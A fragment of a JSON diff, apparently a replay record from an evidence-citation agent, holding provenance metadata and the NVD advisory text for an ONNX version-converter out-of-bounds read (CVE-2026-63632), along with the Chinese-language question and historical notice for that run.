+                  "json_pointer": "/vulnerabilities/0/cve/descriptions/0/value",
+                  "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+                  "field": "description",
+                  "start": 0,
+                  "end": 525,
+                  "external_id": "CVE-2026-63632",
+                  "source_id": "nvd",
+                  "origin": "live",
+                  "title": "CVE-2026-63632",
+                  "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "6e1faf79a36f22ab1028c508",
+                    "base_start": 0,
+                    "base_end": 525,
+                    "source_field_sha256": "8b2957ec5dc456091891f3ab604bd4df7f850c6737c7395fa16e7015c2010394",
+                    "source_field_chars": 525,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "text": "Open Neural Network Exchange (ONNX) is an open standard for machine learning interoperability. From 1.3.0 until 1.22.0, onnx.version_converter.convert_version() can perform an out-of-bounds read in Gemm_7_6::adapt_gemm_7_6() in onnx/version_converter/adapters/gemm_7_6.h when a Gemm node has input tensors with fewer than two dimensions because B_shape[1], A_shape[0], or A_shape[1] is accessed without a rank check, potentially causing a process crash during an opset 7 to 6 downgrade. This issue is fixed in version 1.22.0.",
+                "text_truncated": false,
+                "evidence_id": "6e1faf79a36f22ab1028c508:8b2957ec5dc4",
+                "quote_policy": "server_fills_verified_span"
+              }
+            ],
+            "matching_chunks": 1,
+            "more_available": false,
+            "next_offsets": {
+              "description": 525
+            },
+            "fields_are_excerpts": true,
+            "source_asserted_not_independent_verified": true,
+            "whole_spans_omitted_by_budget": 0
+          }
+        }
+      ],
+      "policy_rejections": [],
+      "attempted_tool_calls": 3
+    },
+    "reason": "langgraph_team_quote_review",
+    "agent_backend": "team",
+    "constraints": [],
+    "historical_replay": true,
+    "deduplicated": false,
+    "historical_notice": "历史真实运行回放 · 非当前新生成。该回答曾遗漏不可信模型的适用条件；仅演示执行与证据展示，不作为独立准确率。",
+    "historical_question": "对照 ONNX 的 GitHub 与 NVD 公告，分别给出原始 pip 范围、首次修复版本及 NVD 的版本措辞。说明触发 API 和 opset 降级路径、输入 rank 条件、未检查的索引、与 InferShapes 问题的边界，并区分 Release 与 ASan 的表现及可能影响，所有结论引用原文，不执行 PoC。"
+  }
+}
